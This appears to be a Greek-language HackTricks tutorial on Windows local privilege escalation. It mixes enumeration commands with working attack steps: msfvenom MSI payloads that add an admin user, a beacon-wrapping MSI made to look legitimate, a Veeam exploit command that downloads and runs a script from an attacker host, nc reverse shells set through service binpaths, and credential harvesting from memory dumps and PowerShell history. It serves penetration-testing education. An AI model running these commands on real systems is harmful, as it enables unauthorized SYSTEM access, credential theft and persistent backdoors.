# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για την αναζήτηση Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική Θεωρία των Windows

### Access Tokens

**Αν δεν ξέρετε τι είναι τα Windows Access Tokens, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Δείτε την παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Αν δεν ξέρετε τι είναι τα integrity levels στα Windows, θα πρέπει να διαβάσετε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Έλεγχοι ασφάλειας των Windows

Υπάρχουν διάφορα στοιχεία στα Windows που μπορούν να **σας εμποδίσουν να κάνετε αναγνώριση του συστήματος**, να εκτελέσετε εκτελέσιμα ή ακόμα και να **εντοπίσουν τις δραστηριότητές σας**. Πρέπει να **διαβάσετε** την παρακάτω **σελίδα** και να **καταγράψετε** όλους αυτούς τους μηχανισμούς **άμυνας** πριν ξεκινήσετε την privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Οι διεργασίες UIAccess που εκκινούνται μέσω του `RAiLaunchAdminProcess` μπορούν να καταχραστούν για να φτάσουν σε High IL χωρίς προτροπές όταν παρακαμφθούν οι έλεγχοι secure-path του AppInfo. Ελέγξτε το αφιερωμένο workflow παράκαμψης UIAccess/Admin Protection εδώ:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η προώθηση της ρύθμισης προσβασιμότητας του Secure Desktop στο μητρώο μπορεί να χρησιμοποιηθεί για αυθαίρετη εγγραφή στο μητρώο ως SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## Πληροφορίες Συστήματος

### Έλεγχος πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει κάποια γνωστή ευπάθεια (ελέγξτε επίσης τα patches που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Έκδοση Exploits

Αυτός ο [ιστότοπος](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμος για την αναζήτηση λεπτομερειών σχετικά με τις ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων έχει περισσότερες από 4.700 ευπάθειες ασφαλείας, δείχνοντας την **τεράστια επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(το Winpeas έχει ενσωματωμένο το watson)_

### Τοπικά με πληροφορίες συστήματος

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

### Github repos of exploits:

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν αποθηκευμένα credentials/Juicy info στις env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Ιστορικό PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript αρχεία

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Καταγράφονται λεπτομέρειες των εκτελέσεων pipeline του PowerShell, συμπεριλαμβανομένων των εκτελεσθέντων εντολών, των κλήσεων εντολών και τμημάτων σεναρίων. Ωστόσο, οι πλήρεις λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου ενδέχεται να μην καταγραφούν.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 συμβάντα από τα PowersShell logs μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται πλήρες αρχείο δραστηριότητας και ολόκληρο το περιεχόμενο της εκτέλεσης του script, εξασφαλίζοντας ότι κάθε block of code τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα περιεκτικό audit trail για κάθε ενέργεια, πολύτιμο για forensics και για την ανάλυση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλης της δραστηριότητας τη στιγμή της εκτέλεσης, παρέχονται λεπτομερείς πληροφορίες σχετικά με τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα αρχεία καταγραφής γεγονότων για το Script Block μπορούν να εντοπιστούν στο Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 συμβάντα μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Μονάδες δίσκου
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να παραβιάσετε το σύστημα εάν οι ενημερώσεις δεν ζητούνται χρησιμοποιώντας http**S** αλλά http.

Ξεκινάτε ελέγχοντας εάν το δίκτυο χρησιμοποιεί non-SSL WSUS update εκτελώντας τα παρακάτω στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή το ακόλουθο σε PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Αν λάβετε απάντηση όπως μία από αυτές:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ισούται με `1`.

Τότε, **είναι εκμεταλλεύσιμο.** Αν η τελευταία καταχώριση μητρώου ισούται με `0`, τότε η καταχώριση WSUS θα αγνοηθεί.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Αυτά είναι weaponized MiTM exploit scripts για να εγχύσουν 'ψεύτικες' ενημερώσεις στην μη-SSL WSUS κίνηση.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Βασικά, αυτό είναι το σφάλμα που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον τοπικό user proxy, και τα Windows Updates χρησιμοποιούν τον proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε έχουμε τη δυνατότητα να τρέξουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά για να υποκλέψουμε την ίδια μας την κίνηση και να τρέξουμε κώδικα ως ανυψωμένος χρήστης στο σύστημά μας.
>
> Επιπλέον, καθώς η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, θα χρησιμοποιήσει επίσης και την αποθήκη πιστοποιητικών του χρήστη. Εάν δημιουργήσουμε ένα self-signed πιστοποιητικό για το hostname του WSUS και προσθέσουμε αυτό το πιστοποιητικό στην αποθήκη πιστοποιητικών του τρέχοντος χρήστη, θα μπορέσουμε να υποκλέψουμε τόσο HTTP όσο και HTTPS WSUS κίνηση. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να εφαρμόσει έναν τύπο επικύρωσης trust-on-first-use στο πιστοποιητικό. Εάν το πιστοποιητικό που παρουσιάζεται είναι εμπιστεύσιμο από τον χρήστη και έχει το σωστό hostname, θα γίνει αποδεκτό από την υπηρεσία.

Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (όταν απελευθερωθεί).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Πολλοί enterprise agents εκθέτουν μια localhost IPC επιφάνεια και ένα προνομιακό κανάλι ενημερώσεων. Εάν η enrollment μπορεί να εξαναγκαστεί σε έναν attacker server και ο updater εμπιστεύεται ένα rogue root CA ή έχει αδύναμους ελέγχους υπογραφής, ένας τοπικός χρήστης μπορεί να παραδώσει ένα κακόβουλο MSI το οποίο η υπηρεσία SYSTEM εγκαθιστά. Δείτε μια γενικευμένη τεχνική (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309) εδώ:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Το Veeam B&R < `11.0.1.1261` εκθέτει μια localhost υπηρεσία στο **TCP/9401** που επεξεργάζεται μηνύματα ελεγχόμενα από επιτιθέμενους, επιτρέποντας αυθαίρετες εντολές ως **NT AUTHORITY\SYSTEM**.

- **Recon**: επιβεβαιώστε τον listener και την έκδοση, π.χ., `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: τοποθετήστε ένα PoC όπως `VeeamHax.exe` μαζί με τα απαιτούμενα Veeam DLLs στον ίδιο κατάλογο, και στη συνέχεια ενεργοποιήστε ένα SYSTEM payload μέσω του τοπικού socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Η υπηρεσία εκτελεί την εντολή ως SYSTEM.
## KrbRelayUp

Υπάρχει μια ευπάθεια τύπου **local privilege escalation** σε περιβάλλοντα Windows **domain** υπό συγκεκριμένες συνθήκες. Αυτές οι συνθήκες περιλαμβάνουν περιβάλλοντα όπου **LDAP signing is not enforced,** χρήστες που έχουν self-rights που τους επιτρέπουν να ρυθμίσουν το **Resource-Based Constrained Delegation (RBCD),** και τη δυνατότητα για χρήστες να δημιουργούν computers εντός του domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **requirements** ικανοποιούνται με τις **default settings**.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Εάν** αυτά τα 2 κλειδιά μητρώου είναι **ενεργοποιημένα** (τιμή είναι **0x1**), τότε χρήστες οποιουδήποτε προνομίου μπορούν να **εγκαταστήσουν** (εκτελέσουν) `*.msi` αρχεία ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Αν έχετε μια meterpreter συνεδρία, μπορείτε να αυτοματοποιήσετε αυτή την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το PowerUP για να δημιουργήσετε μέσα στον τρέχοντα κατάλογο ένα Windows MSI binary για κλιμάκωση προνομίων. Αυτό το script γράφει έναν precompiled MSI installer που ζητά προσθήκη χρήστη/ομάδας (οπότε θα χρειαστείτε πρόσβαση GIU):
```
Write-UserAddMSI
```
Απλώς εκτελέστε το δημιουργημένο binary για ανύψωση προνομίων.

### MSI Wrapper

Διαβάστε αυτόν τον οδηγό για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να πακετάρετε ένα "**.bat**" αρχείο αν **απλώς** θέλετε να **εκτελέσετε** **εντολές**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Δημιουργήστε** με Cobalt Strike ή Metasploit ένα **νέο Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Ανοίξτε **Visual Studio**, επιλέξτε **Create a new project** και γράψτε "installer" στο πεδίο αναζήτησης. Επιλέξτε το έργο **Setup Wizard** και πατήστε **Next**.
- Δώστε στο project ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποιήστε **`C:\privesc`** για την τοποθεσία, επιλέξτε **place solution and project in the same directory**, και κάντε κλικ στο **Create**.
- Συνεχίστε να πατάτε **Next** μέχρι να φτάσετε στο βήμα 3 από 4 (choose files to include). Κάντε κλικ στο **Add** και επιλέξτε το Beacon payload που μόλις δημιουργήσατε. Έπειτα κάντε κλικ στο **Finish**.
- Επιλέξτε το project **AlwaysPrivesc** στο **Solution Explorer** και στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
- Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως το **Author** και το **Manufacturer**, που μπορούν να κάνουν την εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάντε δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και πατήστε **OK**. Αυτό θα διασφαλίσει ότι το beacon payload θα εκτελεστεί μόλις τρέξει ο installer.
- Στις **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **build it**.
- Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε θέσει την πλατφόρμα σε x64.

### MSI Installation

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο **παρασκήνιο:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείτε αυτήν την ευπάθεια μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Ρυθμίσεις καταγραφής

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, οπότε πρέπει να δώσετε προσοχή
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, είναι ενδιαφέρον να γνωρίζουμε πού αποστέλλονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** έχει σχεδιαστεί για τη **διαχείριση των local Administrator passwords**, διασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** σε υπολογιστές που είναι ενταγμένοι σε domain. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια στο Active Directory και μπορούν να αποκτηθούν μόνο από χρήστες στους οποίους έχουν χορηγηθεί επαρκή δικαιώματα μέσω ACLs, επιτρέποντάς τους να προβάλουν local admin passwords εάν είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Εάν είναι ενεργό, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Ξεκινώντας με **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για την Local Security Authority (LSA) ώστε να **αποτρέπει** προσπάθειες από μη αξιόπιστες διεργασίες να **διαβάσουν τη μνήμη της** ή να εγχύσουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** εισήχθη στα **Windows 10**. Σκοπός του είναι να προστατεύει τα credentials που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως οι pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

Οι Domain credentials επικυρώνονται από την Local Security Authority (LSA) και χρησιμοποιούνται από τα συστατικά του λειτουργικού συστήματος. Όταν τα στοιχεία σύνδεσης ενός χρήστη επικυρώνονται από ένα registered security package, συνήθως δημιουργούνται domain credentials για τον χρήστη.\  
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες & Ομάδες

### Απαρίθμηση Χρηστών & Ομάδων

Πρέπει να ελέγξετε αν κάποιες από τις ομάδες στις οποίες ανήκετε έχουν ενδιαφέροντα δικαιώματα
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Προνομιούχες ομάδες

Εάν **ανήκετε σε κάποια προνομιούχα ομάδα, ίσως να μπορείτε να κλιμακώσετε τα προνόμιά σας**. Μάθετε για τις προνομιούχες ομάδες και πώς να τις καταχραστείτε για να κλιμακώσετε τα προνόμιά σας εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Χειρισμός token

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την παρακάτω σελίδα για να **μάθετε για ενδιαφέροντα tokens** και πώς να τα καταχραστείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Συνεδρίες
```bash
qwinsta
klist sessions
```
### Φάκελοι χρήστη
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική Κωδικών Πρόσβασης
```bash
net accounts
```
### Λάβετε το περιεχόμενο του πρόχειρου
```bash
powershell -command "Get-Clipboard"
```
## Διεργασίες σε εκτέλεση

### Δικαιώματα αρχείων και φακέλων

Πρώτα απ' όλα, όταν απαριθμείτε τις διεργασίες, **ελέγξτε για κωδικούς μέσα στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε αν μπορείτε να **αντικαταστήσετε κάποιο binary που εκτελείται** ή αν έχετε δικαιώματα εγγραφής στον binary folder για να εκμεταλλευτείτε πιθανές [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Ελέγχετε πάντα για πιθανή παρουσία [**electron/cef/chromium debuggers** που τρέχουν — μπορείτε να τα εκμεταλλευτείτε για αναβάθμιση προνομίων](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος δικαιωμάτων των processes binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των binaries των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Μπορείς να δημιουργήσεις ένα memory dump ενός εκτελούμενου process χρησιμοποιώντας **procdump** από sysinternals. Υπηρεσίες όπως FTP έχουν τα **credentials in clear text in memory**, προσπάθησε να κάνεις dump τη μνήμη και να διαβάσεις τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Ανασφαλείς GUI εφαρμογές

**Εφαρμογές που τρέχουν ως SYSTEM μπορεί να επιτρέπουν σε έναν χρήστη να ανοίξει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Υπηρεσίες

Τα Service Triggers επιτρέπουν στα Windows να ξεκινήσουν μια υπηρεσία όταν συμβαίνουν ορισμένες συνθήκες (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, κ.λπ.). Ακόμα και χωρίς δικαιώματα SERVICE_START συχνά μπορείτε να ξεκινήσετε προνομιούχες υπηρεσίες ενεργοποιώντας τα triggers τους. Δείτε τεχνικές καταγραφής και ενεργοποίησης εδώ:

-
{{#ref}}
service-triggers.md
{{#endref}}

Λήψη λίστας υπηρεσιών:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείς να χρησιμοποιήσεις **sc** για να πάρεις πληροφορίες για μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το binary **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν αντιμετωπίζετε αυτό το σφάλμα (για παράδειγμα με SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση** σε αυτό το πρόβλημα είναι να εκτελέσετε:
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση διαδρομής εκτελέσιμου αρχείου υπηρεσίας**

Στην περίπτωση όπου η ομάδα "Authenticated users" έχει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα προνόμια μπορούν να αυξηθούν μέσω διαφόρων δικαιωμάτων:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την αναδιαμόρφωση του service binary.
- **WRITE_DAC**: Επιτρέπει την επαναδιαμόρφωση δικαιωμάτων, οδηγώντας στην ικανότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ιδιοκτησίας και την επαναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί την ικανότητα να αλλάζει τις ρυθμίσεις της υπηρεσίας.
- **GENERIC_ALL**: Επίσης κληρονομεί την ικανότητα να αλλάζει τις ρυθμίσεις της υπηρεσίας.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Services binaries weak permissions

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από μια υπηρεσία** ή αν έχετε **write permissions on the folder** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να πάρετε κάθε binary που εκτελείται από μια υπηρεσία χρησιμοποιώντας **wmic** (not in system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

